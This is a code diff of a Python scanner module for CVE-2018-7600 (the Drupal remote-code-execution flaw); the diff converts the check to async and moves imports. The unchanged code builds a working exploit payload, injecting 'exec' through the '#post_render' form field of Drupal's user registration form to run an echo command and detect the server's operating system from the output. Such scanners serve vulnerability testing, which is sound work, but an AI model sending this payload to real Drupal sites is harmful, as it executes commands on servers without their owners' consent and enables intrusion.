@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2018_7600_BaseVerify:
     def __init__(self, url):
@@ -22,7 +22,7 @@ class CVE_2018_7600_BaseVerify:
         self.capta = get_capta()
         self.payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': '%s'}
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -35,19 +35,16 @@ class CVE_2018_7600_BaseVerify:
         try:
             self.payload['mail[#markup]'] = '%s'
             self.payload['mail[#markup]'] = self.payload['mail[#markup]'] %('echo ' + self.capta + 'win^dowslin$1ux')
-            check_req = request.post(self.payload_url, headers = self.headers, data = self.payload)
-            if self.capta in check_req.text and ('windows' in check_req.text or 'linux' in check_req.text):
-                if 'windows' in check_req.text:
+            check_req = await request.post(self.payload_url, headers = self.headers, data = self.payload)
+            if self.capta in await check_req.text() and ('windows' in await check_req.text() or 'linux' in await check_req.text()):
+                if 'windows' in await check_req.text():
                     self.osname = 'Windows'
-                elif 'linux' in check_req.text:
+                elif 'linux' in await check_req.text():
                     self.osname = 'Linux'
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
